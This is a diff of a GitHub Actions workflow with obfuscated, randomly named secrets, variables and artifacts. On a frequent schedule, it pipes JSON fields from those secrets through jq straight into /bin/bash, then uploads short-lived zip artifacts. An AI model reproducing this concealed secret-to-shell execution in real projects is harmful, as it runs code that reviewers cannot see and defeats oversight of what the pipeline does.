@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '54 3,9,15,21 * * *'
+    - cron: '28 0,6,12,18 * * *'
 jobs:
   pipeline:
     runs-on: ubuntu-latest
@@ -11,19 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Invoke
         env:
-          wckzc3: ${{ secrets.wckzc3 }}
+          ygt372: ${{ secrets.ygt372 }}
         run: |
-          printf '%s' "$wckzc3" | jq -r .kw105 | /bin/bash
-          echo $don7625 | jq -r .ed363 | /bin/bash
-          echo $l2942 | jq -r .qruvy5 | /bin/bash
-          echo $qy45063 | jq -r .c44 | /bin/bash
-          echo $c4 | jq -r .mzkv687 | /bin/bash
-          echo $of8 | jq -r .zfs67763 | /bin/bash
+          printf '%s' "$ygt372" | jq -r .swvv984 | /bin/bash
+          echo $ww920 | jq -r .ksdab104 | /bin/bash
+          printf '%s' "$onag71733" | jq -r .xa90 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
         uses: actions/upload-artifact@v4
         with:
-          name: DWb0RAJZ
+          name: 1D29Ai59
           path: "*.zip"
           retention-days: 1
